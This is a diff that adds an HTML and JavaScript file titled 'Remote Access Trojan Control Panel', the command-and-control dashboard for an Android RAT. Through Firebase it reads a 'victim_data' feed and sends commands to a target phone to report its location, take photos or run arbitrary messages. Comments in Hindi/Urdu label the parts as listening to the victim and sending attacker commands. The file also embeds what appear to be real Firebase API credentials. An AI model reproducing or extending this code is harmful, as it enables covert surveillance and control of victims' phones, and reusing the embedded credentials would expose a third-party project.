@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control Dashboard</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f9; }
+        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #333; }
+        .controls { margin-bottom: 20px; }
+        .controls button { padding: 12px 20px; margin: 5px; font-size: 16px; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 5px; transition: background-color 0.3s; }
+        .controls button:hover { background-color: #218838; }
+        .data-display { margin-top: 30px; padding: 15px; border: 2px solid #007bff; background-color: #e9f5ff; min-height: 150px; white-space: pre-wrap; font-size: 14px; border-radius: 5px;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Remote Access Trojan Control Panel</h1>
+
+        <div class="controls">
+            <button id="btnLocate">📍 Get Location</button>
+            <button id="btnTakePhoto">📸 Take Photo</button>
+            <button id="btnSendMessage">💬 Send Message</button>
+        </div>
+
+        <h2>📈 Live Data Feed (From Target Phone):</h2>
+        <div id="dataFeed" class="data-display">Connecting to Firebase... Waiting for phone data...</div>
+    </div>
+
+    <!-- Firebase SDK Import -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <script>
+        // ======================================================================
+        // !!! FIREBASE CREDENTIALS ADDED HERE !!!
+        // ======================================================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyBfNLEfNWShC5CGmw5a-uhpGUn7N9S92To",
+            authDomain: "androidrat-project.firebaseapp.com",
+            databaseURL: "https://androidrat-project-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "androidrat-project",
+            storageBucket: "androidrat-project.firebasestorage.app",
+            messagingSenderId: "455946700270",
+            appId: "1:455946700270:web:abe6a4f3f552ac84a5baff",
+            measurementId: "G-W4RM1L5J31"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const dataFeed = document.getElementById('dataFeed');
+
+        // ======================================================================
+        // 1. REALTIME LISTENER (Sunne Wala Hisa - Victim se data sunna)
+        // ======================================================================
+        database.ref('victim_data').on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                // Data ko beautiful JSON format mein dikhana
+                dataFeed.innerHTML = `<strong>DATA RECEIVED:</strong>
+<pre>${JSON.stringify(data, null, 2)}</pre>`;
+            } else {
+                dataFeed.textContent = "No data received yet. Ensure the Android App is reporting.";
+            }
+        }, (error) => {
+            dataFeed.textContent = `Error listening to data: ${error.message}`;
+        });
+
+        // ======================================================================
+        // 2. COMMAND SENDING FUNCTIONS (Bhejne Wala Hisa - Attacker se command bhejna)
+        // ======================================================================
+
+        // Location Command
+        document.getElementById('btnLocate').onclick = () => {
+            // Command queue mein 'action' key use kar rahe hain
+            database.ref('command_queue').child('action').set('GET_LOCATION');
+            dataFeed.innerHTML = "Command Sent: Requesting Location from Target Phone...";
+        };
+
+        // Photo Command
+        document.getElementById('btnTakePhoto').onclick = () => {
+            database.ref('command_queue').child('action').set('TAKE_PHOTO');
+            dataFeed.innerHTML = "Command Sent: Requesting Photo Capture from Target Phone...";
+        };
+
+        // Message Command
+        document.getElementById('btnSendMessage').onclick = () => {
+             const msg = prompt("Command Message Daalein (e.g., 'Reboot', 'Sleep'):");
+             if (msg) {
+                // Message ko 'message' key ke under daalna
+                database.ref('command_queue').child('message').set(msg);
+                dataFeed.innerHTML = `Command Sent: Sending message: "${msg}"`;
+             }
+        };
+    </script>
+</body>
+</html>
